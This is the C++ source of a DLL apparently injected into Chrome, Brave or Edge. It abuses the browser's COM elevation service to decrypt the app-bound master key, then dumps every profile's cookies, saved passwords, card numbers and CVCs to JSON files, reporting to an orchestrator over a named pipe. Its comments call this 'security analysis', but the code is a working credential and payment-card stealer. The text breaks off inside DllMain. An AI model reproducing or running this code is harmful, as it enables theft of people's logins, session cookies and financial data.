// kvc_crypt.cpp
#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>

#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <unordered_map>

#include "SelfLoader.h"
#include "winsqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

// Simplified string utilities for essential conversions only
namespace StringUtils
{
    // Convert filesystem path to API-compatible string
    inline std::string path_to_string(const fs::path& path)
    {
        return path.string();
    }
}

// COM Interface Protection Levels for Browser Elevation Services
enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

// Chrome/Brave Base Elevator Interface - COM interop for browser security services
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

// Edge Elevator Base Interface - placeholder methods for compatibility
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};

// Edge Intermediate Elevator Interface - extends base functionality
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

// Edge Final Elevator Interface - complete implementation
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator {};

namespace SecurityComponents
{
    class PipeLogger;

    namespace Utils
    {
        // Get Local AppData folder path with comprehensive error handling
        fs::path GetLocalAppDataPath()
        {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
            {
                fs::path result = path;
                CoTaskMemFree(path);
                return result;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        // Base64 decode utility for processing encrypted keys
        std::optional<std::vector<uint8_t>> Base64Decode(const std::string& input)
        {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
                return std::nullopt;
            
            std::vector<uint8_t> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
                return std::nullopt;
            
            return data;
        }

        // Convert binary data to hex string for diagnostic logging
        std::string BytesToHexString(const std::vector<uint8_t>& bytes)
        {
            std::ostringstream oss;
            oss << std::hex << std::setfill('0');
            for (uint8_t byte : bytes)
                oss << std::setw(2) << static_cast<int>(byte);
            return oss.str();
        }

        // Escape JSON strings for safe output serialization
        std::string EscapeJson(const std::string& s)
        {
            std::ostringstream o;
            for (char c : s)
            {
                switch (c)
                {
                case '"': o << "\\\""; break;
                case '\\': o << "\\\\"; break;
                case '\b': o << "\\b"; break;
                case '\f': o << "\\f"; break;
                case '\n': o << "\\n"; break;
                case '\r': o << "\\r"; break;
                case '\t': o << "\\t"; break;
                default:
                    if ('\x00' <= c && c <= '\x1f')
                    {
                        o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                    }
                    else
                    {
                        o << c;
                    }
                }
            }
            return o.str();
        }
    }

    namespace Browser
    {
        // Browser configuration structure for multi-platform support
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        // Get comprehensive browser configurations mapping
        const std::unordered_map<std::string, Config>& GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", 
                    {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, 
                    {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, 
                    fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", 
                    {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, 
                    {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, 
                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", 
                    {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, 
                    {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, 
                    fs::path("Microsoft") / "Edge" / "User Data"}}
            };
            return browser_configs;
        }

        // Detect current browser process configuration from runtime environment
        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto& configs = GetConfigs();
            if (processName == "chrome.exe") return configs.at("chrome");
            if (processName == "brave.exe") return configs.at("brave");
            if (processName == "msedge.exe") return configs.at("edge");

            throw std::runtime_error("Unsupported host process: " + processName);
        }
    }

    namespace Crypto
    {
        // Cryptographic constants for AES-GCM decryption operations
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        
        // Support for multiple encryption format versions
        const std::string V10_PREFIX = "v10";
        const std::string V20_PREFIX = "v20";

        // Simple RAII wrapper for BCrypt algorithm handle
        class BCryptAlgorithm
        {
        public:
            BCryptAlgorithm() { BCryptOpenAlgorithmProvider(&handle, BCRYPT_AES_ALGORITHM, nullptr, 0); }
            ~BCryptAlgorithm() { if (handle) BCryptCloseAlgorithmProvider(handle, 0); }
            operator BCRYPT_ALG_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
        private:
            BCRYPT_ALG_HANDLE handle = nullptr;
        };

        // Simple RAII wrapper for BCrypt key handle
        class BCryptKey
        {
        public:
            BCryptKey(BCRYPT_ALG_HANDLE alg, const std::vector<uint8_t>& key)
            {
                BCryptGenerateSymmetricKey(alg, &handle, nullptr, 0, 
                                         const_cast<PUCHAR>(key.data()), static_cast<ULONG>(key.size()), 0);
            }
            ~BCryptKey() { if (handle) BCryptDestroyKey(handle); }
            operator BCRYPT_KEY_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
        private:
            BCRYPT_KEY_HANDLE handle = nullptr;
        };

        // Decrypt GCM-encrypted data using AES-GCM algorithm (supports v10 and v20 formats)
        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob)
        {
            // Auto-detect encryption format version
            std::string detectedPrefix;
            size_t prefixLength = 0;
            
            if (blob.size() >= 3)
            {
                if (memcmp(blob.data(), V10_PREFIX.c_str(), V10_PREFIX.length()) == 0)
                {
                    detectedPrefix = V10_PREFIX;
                    prefixLength = V10_PREFIX.length();
                }
                else if (memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) == 0)
                {
                    detectedPrefix = V20_PREFIX;  
                    prefixLength = V20_PREFIX.length();
                }
                else
                {
                    return {};
                }
            }
            else
            {
                return {};
            }

            const size_t GCM_OVERHEAD_LENGTH = prefixLength + GCM_IV_LENGTH + GCM_TAG_LENGTH;
            if (blob.size() < GCM_OVERHEAD_LENGTH)
                return {};

            // Initialize BCrypt AES-GCM cryptographic provider
            BCryptAlgorithm algorithm;
            if (!algorithm.IsValid())
                return {};

            BCryptSetProperty(algorithm, BCRYPT_CHAINING_MODE, 
                            reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)), 
                            sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            // Generate symmetric key from raw key material
            BCryptKey cryptoKey(algorithm, key);
            if (!cryptoKey.IsValid())
                return {};

            // Extract cryptographic components from blob
            const uint8_t* iv = blob.data() + prefixLength;
            const uint8_t* ct = iv + GCM_IV_LENGTH;
            const uint8_t* tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - prefixLength - GCM_IV_LENGTH - GCM_TAG_LENGTH);

            // Configure GCM authenticated encryption parameters
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = const_cast<PUCHAR>(iv);
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = const_cast<PUCHAR>(tag);
            authInfo.cbTag = GCM_TAG_LENGTH;

            // Perform authenticated decryption with integrity verification
            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            
            NTSTATUS status = BCryptDecrypt(cryptoKey, const_cast<PUCHAR>(ct), ct_len, &authInfo, 
                                          nullptr, 0, plain.data(), static_cast<ULONG>(plain.size()), &outLen, 0);
            if (!NT_SUCCESS(status))
                return {};

            plain.resize(outLen);
            return plain;
        }

        // Extract and validate encrypted master key from Local State configuration
        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path& localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            const std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("app_bound_encrypted_key not found.");

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed app_bound_encrypted_key.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of key failed.");

            auto& decodedData = *optDecoded;
            if (decodedData.size() < sizeof(KEY_PREFIX) || 
                memcmp(decodedData.data(), KEY_PREFIX, sizeof(KEY_PREFIX)) != 0)
            {
                throw std::runtime_error("Key prefix validation failed.");
            }
            return {decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end()};
        }
    }

    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        // Function pointer types for extraction operations
        typedef std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>(*PreQuerySetupFunc)(sqlite3*);
        typedef std::optional<std::string>(*JsonFormatterFunc)(sqlite3_stmt*, const std::vector<uint8_t>&, void*);

        // Configuration structure for database extraction operations
        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            PreQuerySetupFunc preQuerySetup;
            JsonFormatterFunc jsonFormatter;
        };

        // Pre-query setup for payment cards - loads CVC data
        std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> SetupPaymentCards(sqlite3* db)
        {
            auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                return cvcMap;
            
            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 1));
                if (guid && blob)
                    (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
            }
            sqlite3_finalize(stmt);
            return cvcMap;
        }

        // JSON formatter for cookies
        std::optional<std::string> FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 6));
            if (!blob) return std::nullopt;
            
            auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
            if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                return std::nullopt;

            const char* value_start = reinterpret_cast<const char*>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
            size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;

            std::ostringstream json_entry;
            json_entry << "  {\"host\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))) << "\""
                      << ",\"name\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) << "\""
                      << ",\"path\":\"" << Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2))) << "\""
                      << ",\"value\":\"" << Utils::EscapeJson({value_start, value_size}) << "\""
                      << ",\"expires\":" << sqlite3_column_int64(stmt, 5)
                      << ",\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false")
                      << ",\"httpOnly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false")
                      << "}";
            return json_entry.str();
        }

        // JSON formatter for passwords
        std::optional<std::string> FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 2));
            if (!blob) return std::nullopt;
            
            auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
            return "  {\"origin\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))) +
                  "\",\"username\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) +
                  "\",\"password\":\"" + Utils::EscapeJson({reinterpret_cast<char*>(plain.data()), plain.size()}) + "\"}";
        }

        // JSON formatter for payment cards
        std::optional<std::string> FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state)
        {
            auto cvcMap = reinterpret_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>*>(state);
            std::string card_num_str, cvc_str;
            
            // Decrypt primary card number
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 4));
            if (blob)
            {
                auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                card_num_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
            }
            
            // Decrypt associated CVC if available
            const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
            if (guid && cvcMap && (*cvcMap)->count(guid))
            {
                auto plain = Crypto::DecryptGcm(key, (*cvcMap)->at(guid));
                cvc_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
            }
            
            return "  {\"name_on_card\":\"" + Utils::EscapeJson(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))) +
                  "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                  ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                  ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                  "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
        }

        // Comprehensive extraction configurations for different browser data types
        const std::vector<ExtractionConfig>& GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                // Browser cookie extraction configuration
                {fs::path("Network") / "Cookies", "cookies", 
                 "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr, FormatCookie},
                
                // Stored password extraction configuration
                {"Login Data", "passwords", 
                 "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr, FormatPassword},

                // Payment card information extraction configuration
                {"Web Data", "payments", 
                 "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 SetupPaymentCards, FormatPayment}
            };
            return configs;
        }
    }

    // Named pipe communication interface with orchestrator process
    class PipeLogger
    {
    public:
        explicit PipeLogger(LPCWSTR pipeName)
        {
            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }

        ~PipeLogger()
        {
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                FlushFileBuffers(m_pipe);
                CloseHandle(m_pipe);
            }
        }

        bool isValid() const noexcept { return m_pipe != INVALID_HANDLE_VALUE; }

        // Send diagnostic message to orchestrator
        void Log(const std::string& message)
        {
            if (isValid())
            {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
            }
        }

        HANDLE getHandle() const noexcept { return m_pipe; }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
    };

    // Browser configuration and path management
    class BrowserManager
    {
    public:
        BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

        const Browser::Config& getConfig() const noexcept { return m_config; }
        
        // Resolve user data root directory for current browser configuration
        fs::path getUserDataRoot() const
        {
            return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
        }

    private:
        Browser::Config m_config;
    };

    // Master key decryption service using COM elevation interfaces
    class MasterKeyDecryptor
    {
    public:
        explicit MasterKeyDecryptor(PipeLogger& logger) : m_logger(logger)
        {
            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
            {
                throw std::runtime_error("Failed to initialize COM library.");
            }
            m_comInitialized = true;
            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
        }

        ~MasterKeyDecryptor()
        {
            if (m_comInitialized)
            {
                CoUninitialize();
            }
        }

        // Decrypt master key using browser-specific COM elevation service
        std::vector<uint8_t> Decrypt(const Browser::Config& config, const fs::path& localStatePath)
        {
            m_logger.Log("[*] Reading Local State file: " + StringUtils::path_to_string(localStatePath));
            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

            // Prepare encrypted key as BSTR for COM interface
            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char*>(encryptedKeyBlob.data()), 
                                                  static_cast<UINT>(encryptedKeyBlob.size()));
            if (!bstrEncKey)
                throw std::runtime_error("SysAllocStringByteLen for encrypted key failed.");

            BSTR bstrPlainKey = nullptr;
            HRESULT hr = E_FAIL;
            DWORD comErr = 0;

            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
            
            // Use Edge-specific COM elevation interface
            if (config.name == "Edge")
            {
                Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
                                    COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
                                    RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }
            // Use Chrome/Brave COM elevation interface
            else
            {
                Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
                                    COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
                                    RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }

            // Cleanup and validate COM decryption operation result
            SysFreeString(bstrEncKey);
            
            if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
            {
                if (bstrPlainKey) SysFreeString(bstrPlainKey);
                std::ostringstream oss;
                oss << "IElevator->DecryptData failed. HRESULT: 0x" << std::hex << hr;
                throw std::runtime_error(oss.str());
            }

            // Extract raw AES key bytes from BSTR
            std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
            memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
            SysFreeString(bstrPlainKey);
            return aesKey;
        }

    private:
        PipeLogger& m_logger;
        bool m_comInitialized = false;
    };

    // Browser profile discovery and enumeration service
    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(const fs::path& userDataRoot, PipeLogger& logger) 
            : m_userDataRoot(userDataRoot), m_logger(logger) {}

        // Discover all browser profiles containing extractable databases
        std::vector<fs::path> FindProfiles()
        {
            m_logger.Log("[*] Discovering browser profiles in: " + StringUtils::path_to_string(m_userDataRoot));
            std::vector<fs::path> profilePaths;

            // Check if directory contains extractable database files
            auto isProfileDirectory = [](const fs::path& path)
            {
                for (const auto& dataCfg : Data::GetExtractionConfigs())
                {
                    if (fs::exists(path / dataCfg.dbRelativePath))
                        return true;
                }
                return false;
            };

            // Check if root directory qualifies as a profile
            if (isProfileDirectory(m_userDataRoot))
            {
                profilePaths.push_back(m_userDataRoot);
            }

            // Scan for profile subdirectories with database content
            std::error_code ec;
            for (const auto& entry : fs::directory_iterator(m_userDataRoot, ec))
            {
                if (!ec && entry.is_directory() && isProfileDirectory(entry.path()))
                {
                    profilePaths.push_back(entry.path());
                }
            }

            if (ec)
            {
                m_logger.Log("[-] Filesystem ERROR during profile discovery: " + ec.message());
            }

            // Remove duplicates using sort + unique instead of std::set
            std::sort(profilePaths.begin(), profilePaths.end());
            profilePaths.erase(std::unique(profilePaths.begin(), profilePaths.end()), profilePaths.end());

            m_logger.Log("[+] Found " + std::to_string(profilePaths.size()) + " profile(s).");
            return profilePaths;
        }

    private:
        fs::path m_userDataRoot;
        PipeLogger& m_logger;
    };

    // Database content extraction service using SQLite interface
    class DataExtractor
    {
    public:
        DataExtractor(const fs::path& profilePath, const Data::ExtractionConfig& config,
                      const std::vector<uint8_t>& aesKey, PipeLogger& logger,
                      const fs::path& baseOutputPath, const std::string& browserName)
            : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}

        // Extract and decrypt data from browser database
        void Extract()
        {
            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
            if (!fs::exists(dbPath))
                return;

            // Open database with nolock parameter for live extraction without file locking
            sqlite3* db = nullptr;
            std::string uriPath = "file:" + StringUtils::path_to_string(dbPath) + "?nolock=1";
            std::replace(uriPath.begin(), uriPath.end(), '\\', '/');

            if (sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to open database " + StringUtils::path_to_string(dbPath) + 
                           ": " + (db ? sqlite3_errmsg(db) : "N/A"));
                if (db) sqlite3_close_v2(db);
                return;
            }

            // Prepare SQL query for data extraction
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
            {
                sqlite3_close_v2(db);
                return;
            }

            // Execute pre-query setup if needed (e.g., for payment card CVCs)
            void* preQueryState = nullptr;
            std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> cvcMap;
            if (m_config.preQuerySetup)
            {
                cvcMap = m_config.preQuerySetup(db);
                preQueryState = &cvcMap;
            }

            // Extract and format data entries using custom formatters
            std::vector<std::string> jsonEntries;
            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                if (auto jsonEntry = m_config.jsonFormatter(stmt, m_aesKey, preQueryState))
                {
                    jsonEntries.push_back(*jsonEntry);
                }
            }

            sqlite3_finalize(stmt);
            sqlite3_close_v2(db);

            // Write extraction results to structured JSON output file
            if (!jsonEntries.empty())
            {
                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / 
                                     (m_config.outputFileName + ".json");
                
                std::error_code ec;
                fs::create_directories(outFilePath.parent_path(), ec);
                if (ec)
                {
                    m_logger.Log("[-] Failed to create directory: " + StringUtils::path_to_string(outFilePath.parent_path()));
                    return;
                }

                std::ofstream out(outFilePath, std::ios::trunc);
                if (!out) return;

                out << "[\n";
                for (size_t i = 0; i < jsonEntries.size(); ++i)
                {
                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
                }
                out << "\n]\n";

                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + 
                           " extracted to " + StringUtils::path_to_string(outFilePath));
            }
        }

    private:
        fs::path m_profilePath;
        const Data::ExtractionConfig& m_config;
        const std::vector<uint8_t>& m_aesKey;
        PipeLogger& m_logger;
        fs::path m_baseOutputPath;
        std::string m_browserName;
    };

    // Main orchestrator for browser security analysis operations
    class SecurityOrchestrator
    {
    public:
        explicit SecurityOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
        {
            if (!m_logger.isValid())
            {
                throw std::runtime_error("Failed to connect to named pipe from orchestrator.");
            }
            ReadPipeParameters();
        }

        // Execute complete browser security analysis workflow
        void Run()
        {
            BrowserManager browserManager;
            const auto& browserConfig = browserManager.getConfig();
            m_logger.Log("[*] Security analysis process started for " + browserConfig.name);

            // Decrypt master key using COM elevation service
            std::vector<uint8_t> aesKey;
            {
                MasterKeyDecryptor keyDecryptor(m_logger);
                fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
                aesKey = keyDecryptor.Decrypt(browserConfig, localStatePath);
            }
            m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));

            // Discover and process all browser profiles systematically
            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profilePaths = enumerator.FindProfiles();

            for (const auto& profilePath : profilePaths)
            {
                m_logger.Log("[*] Processing profile: " + StringUtils::path_to_string(profilePath.filename()));
                
                // Extract each data type (cookies, passwords, payments) using specialized handlers
                for (const auto& dataConfig : Data::GetExtractionConfigs())
                {
                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
                    extractor.Extract();
                }
            }

            m_logger.Log("[*] All profiles processed. Security analysis process finished.");
        }

    private:
        // Read configuration parameters from orchestrator via named pipe
        void ReadPipeParameters()
        {
            char buffer[MAX_PATH + 1] = {0};
            DWORD bytesRead = 0;
            
            // Read verbose flag configuration
            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            
            // Read output path configuration
            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_outputPath = buffer;
        }

        PipeLogger m_logger;
        fs::path m_outputPath;
    };
}

// Thread parameters for security module worker thread
struct ModuleThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromOrchestrator;
};

// Main worker thread for browser security analysis operations
DWORD WINAPI SecurityModuleWorker(LPVOID lpParam)
{
    auto thread_params = std::unique_ptr<ModuleThreadParams>(static_cast<ModuleThreadParams*>(lpParam));

    try
    {
        SecurityComponents::SecurityOrchestrator orchestrator(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromOrchestrator));
        orchestrator.Run();
    }
    catch (const std::exception& e)
    {
        try
        {
            // Attempt to log error through pipe if communication channel is available
            SecurityComponents::PipeLogger errorLogger(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromOrchestrator));
            if (errorLogger.isValid())
            {
                errorLogger.Log("[-] CRITICAL SECURITY MODULE ERROR: " + std::string(e.what()));
            }
        }
        catch (...) {} // Failsafe error handling if logging subsystem fails
    }

    FreeLibraryAndExitThread(thread_params->hModule_dll, 0);
    return 0;
}

// Security module entry point - initializes browser security analysis operations
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ModuleThreadParams{hModule, lpReserved};
        if (!params) return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, SecurityModuleWorker, params, 0, NULL);
        if (hThread)
        {
